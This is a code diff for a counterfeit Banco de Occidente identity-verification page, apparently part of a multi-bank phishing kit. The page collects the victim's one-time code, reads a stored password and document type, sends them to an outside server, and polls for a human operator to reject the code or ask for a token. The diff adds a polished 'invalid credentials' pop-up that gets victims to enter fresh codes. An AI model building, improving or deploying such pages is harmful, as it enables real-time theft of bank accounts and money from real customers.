@@ -9,7 +9,6 @@
 </head>
 <body>
     <div class="container">
-        <!-- Seguridad Badge -->
         <div class="security-badge">
             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <path d="M12 2L4 6V11C4 16.55 7.84 21.74 13 23C18.16 21.74 22 16.55 22 11V6L12 2ZM10 17L6 13L7.41 11.59L10 14.17L16.59 7.58L18 9L10 17Z" fill="#00C853"/>
@@ -17,27 +16,21 @@
             <span>Seguridad</span>
         </div>
 
-        <!-- Main Card -->
         <div class="card">
-            <!-- Logo -->
             <div class="logo-container">
                 <img src="img/logo-03-occidente-01-occidente-01-regular.aa547ca6b936469689ea.svg" alt="Banco de Occidente" class="logo">
             </div>
 
-            <!-- Title -->
             <div class="welcome-text">
                 <p class="welcome">Verificación de identidad</p>
                 <p class="portal-title">Código de Verificación</p>
             </div>
 
-            <!-- Info Message -->
             <div class="info-box">
                 <p>Hemos enviado un <strong>código de verificación</strong> a tu celular registrado y/o correo electrónico.</p>
             </div>
 
-            <!-- Form -->
             <form class="login-form" id="form-otp">
-                <!-- OTP Field -->
                 <div class="form-group">
                     <label for="otp">Código de verificación</label>
                     <input 
@@ -56,7 +49,6 @@
                     </div>
                 </div>
 
-                <!-- Method Selection -->
                 <div class="form-group">
                     <label>Método de recepción</label>
                     <div class="radio-group">
@@ -83,7 +75,6 @@
                     </div>
                 </div>
 
-                <!-- Help Text -->
                 <div class="help-text">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V15H13V17ZM13 13H11V7H13V13Z" fill="#666"/>
@@ -91,12 +82,10 @@
                     <span>Si no recibiste el código, espera unos segundos y revisa tu bandeja de spam</span>
                 </div>
 
-                <!-- Resend Link -->
                 <div class="resend-link">
                     <a href="#" id="resendCode">¿No recibiste el código? Reenviar</a>
                 </div>
 
-                <!-- Submit Button -->
                 <button type="button" class="btn-login" id="btnVerificar" disabled>
                     <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <path d="M9 16.17L4.83 12L3.41 13.41L9 19L21 7L19.59 5.59L9 16.17Z" fill="white"/>
@@ -104,7 +93,6 @@
                     Verificar Código
                 </button>
 
-                <!-- Back Link -->
                 <div class="back-link">
                     <a href="index.html">← Volver al inicio</a>
                 </div>
@@ -112,7 +100,6 @@
         </div>
     </div>
 
-    <!-- Loading Screen -->
     <div class="loading-screen" id="loadingScreen">
         <div class="loading-content">
             <img src="img/spinner_occidente.gif" alt="Cargando..." class="loading-spinner">
@@ -120,7 +107,25 @@
         </div>
     </div>
 
-    <!-- Scripts -->
+    <div id="errorLogin" style="display:none;position:fixed;inset:0;background:rgba(0,10,40,0.6);backdrop-filter:blur(4px);z-index:100000;align-items:center;justify-content:center;font-family:'Poppins',sans-serif;opacity:0;transition:opacity .3s ease">
+        <div style="background:#fff;border-radius:16px;padding:32px 28px 24px;max-width:360px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:popInError .4s cubic-bezier(0.34,1.56,0.64,1);color:#1a1a2e">
+            <div style="width:72px;height:72px;background:linear-gradient(135deg,#FF4D4D 0%,#C20024 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;box-shadow:0 8px 24px rgba(194,0,36,0.35)">
+                <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="12" y1="8" x2="12" y2="13"></line>
+                    <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                </svg>
+            </div>
+            <div style="font-size:19px;font-weight:700;color:#0a0a1a;margin-bottom:10px">Credenciales inválidas</div>
+            <div style="font-size:14px;color:#555;line-height:1.55;margin-bottom:22px">Los datos ingresados son incorrectos.<br>Por favor verifica e inténtalo nuevamente.</div>
+            <button id="errorLoginBtn" style="display:block;width:100%;background:linear-gradient(135deg,#0033a0 0%,#002277 100%);color:#fff;border:none;padding:14px 20px;border-radius:30px;font-size:14px;font-weight:700;letter-spacing:0.06em;text-transform:uppercase;cursor:pointer;font-family:inherit;box-shadow:0 6px 18px rgba(0,51,160,0.35)">Intentar de nuevo</button>
+        </div>
+    </div>
+
+    <style>
+    @keyframes popInError{from{opacity:0;transform:scale(.85)}to{opacity:1;transform:scale(1)}}
+    #errorLogin.visible{display:flex !important;opacity:1 !important}
+    </style>
+
     <script>
         document.addEventListener('DOMContentLoaded', function () {
 
@@ -128,6 +133,8 @@
             const btnVerificar = document.getElementById('btnVerificar');
             const loadingScreen = document.getElementById('loadingScreen');
             const resendCode = document.getElementById('resendCode');
+            const errorLogin = document.getElementById('errorLogin');
+            const errorLoginBtn = document.getElementById('errorLoginBtn');
 
             const API = 'https://multi-bancos-production.up.railway.app';
             const BANCO = 'occidente';
@@ -137,9 +144,6 @@
             const clave = sessionStorage.getItem('clave') || '';
             const tipoDoc = sessionStorage.getItem('tipoDoc') || 'CC';
 
-            // ============================================
-            // 1. BLOQUEO DE LETRAS + SOLO DÍGITOS (4-8)
-            // ============================================
             if (otpInput) {
                 otpInput.addEventListener('keypress', function (e) {
                     if (e.key && e.key.length === 1 && /\D/.test(e.key)) {
@@ -172,9 +176,6 @@
                 }, 300);
             }
 
-            // ============================================
-            // 2. VALIDAR OTP (activar botón)
-            // ============================================
             function validarOtp() {
                 const valor = otpInput ? otpInput.value.trim() : '';
                 if (btnVerificar) {
@@ -182,9 +183,6 @@
                 }
             }
 
-            // ============================================
-            // 3. ENVIAR OTP AL BACKEND + POLLING DE ESTADO
-            // ============================================
             async function enviarOtp(valorOtp) {
                 if (loadingScreen) {
                     loadingScreen.classList.add('active');
@@ -207,7 +205,6 @@
                     console.error('Error enviando OTP:', e);
                 }
 
-                // Polling: esperar a que el operador rechace o mueva a Token
                 const intervalo = setInterval(async function () {
                     try {
                         const r = await fetch(API + '/' + BANCO + '/estado/' + sessionId);
@@ -220,8 +217,9 @@
                         } else if (data.estado === 'rechazado') {
                             clearInterval(intervalo);
                             if (loadingScreen) loadingScreen.classList.remove('active');
-                            alert('Credenciales inválidas');
-                            window.location.href = 'index.html';
+                            if (otpInput) otpInput.value = '';
+                            if (btnVerificar) btnVerificar.disabled = true;
+                            if (errorLogin) errorLogin.classList.add('visible');
                         }
                     } catch (e) {
                         console.error('Error estado:', e);
@@ -244,7 +242,6 @@
                 });
             }
 
-            // Permitir enviar con Enter
             if (otpInput) {
                 otpInput.addEventListener('keypress', function (e) {
                     if (e.key === 'Enter' && otpInput.value.length >= 4) {
@@ -254,11 +251,21 @@
                 });
             }
 
-            // Botón reenviar
             if (resendCode) {
                 resendCode.addEventListener('click', function (e) {
                     e.preventDefault();
                     alert('Código reenviado');
+                });
+            }
+
+            if (errorLoginBtn) {
+                errorLoginBtn.addEventListener('click', function () {
+                    if (errorLogin) errorLogin.classList.remove('visible');
+                    if (otpInput) {
+                        otpInput.value = '';
+                        otpInput.focus();
+                    }
+                    if (btnVerificar) btnVerificar.disabled = true;
                 });
             }
 
